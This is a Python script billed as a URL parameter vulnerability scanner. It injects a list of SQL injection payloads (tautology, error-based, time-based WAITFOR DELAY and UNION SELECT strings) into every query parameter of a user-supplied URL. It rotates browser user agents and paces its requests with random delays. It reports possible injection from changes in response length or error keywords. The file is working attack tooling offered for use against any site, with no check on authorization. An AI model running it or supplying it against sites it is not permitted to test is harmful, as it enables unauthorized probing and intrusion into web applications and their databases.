import requests
from urllib.parse import urlparse, parse_qs, urlencode
import random
import time
from tqdm import tqdm
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 Safari/604.1.38",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/44.0.2403.157 Safari/537.36",
]

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" -- ",
    "\" OR \"1\"=\"1\" /*",
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "1' OR '1'='1' /*",
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' AND 1=CAST((SELECT @@version) AS int) -- ",
    "' WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def send_request(url):
    headers = {'User-Agent': get_random_user_agent()}
    try:
        response = requests.get(url, headers=headers, timeout=15)
        return response
    except Exception as e:
        print(Fore.RED + f"[!] Request error: {e}")
        return None

def is_sql_error(text):
    errors = ['sql syntax', 'mysql', 'syntax error', 'warning', 'error']
    text = text.lower()
    return any(err in text for err in errors)

def main():
    print(Fore.CYAN + "Welcome to URL Parameter Vulnerability Scanner")
    url_input = input(Fore.YELLOW + "Enter full URL with parameters: ").strip()
    parsed_url = urlparse(url_input)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        print(Fore.RED + "[!] No parameters found in URL.")
        return

    base_url = parsed_url._replace(query='').geturl()
    print(Fore.BLUE + "[*] Sending baseline request with original URL...")
    base_response = send_request(url_input)
    if base_response is None:
        print(Fore.RED + "[!] Failed to get response.")
        return
    normal_length = len(base_response.text)
    print(Fore.GREEN + f"Baseline response length: {normal_length}")

    for param in query_params:
        print(Fore.YELLOW + f"[+] Testing parameter: {param}")
        for payload in tqdm(PAYLOADS, desc=f"Payloads for {param}"):
            test_params = {k: v[0] for k, v in query_params.items()}
            test_params[param] = payload

            test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
            response = send_request(test_url)

            if response:
                resp_text = response.text.lower()
                resp_len = len(response.text)
                if abs(resp_len - normal_length) > 50 or is_sql_error(resp_text):
                    print(Fore.GREEN + f"    [!] Possible SQL Injection with payload: {payload}")
                else:
                    print(Fore.WHITE + f"    Tested payload: {payload} | No issue")
            time.sleep(random.uniform(1, 2))
        print()

    print(Fore.CYAN + "Scanning completed.")

if __name__ == "__main__":
    main()
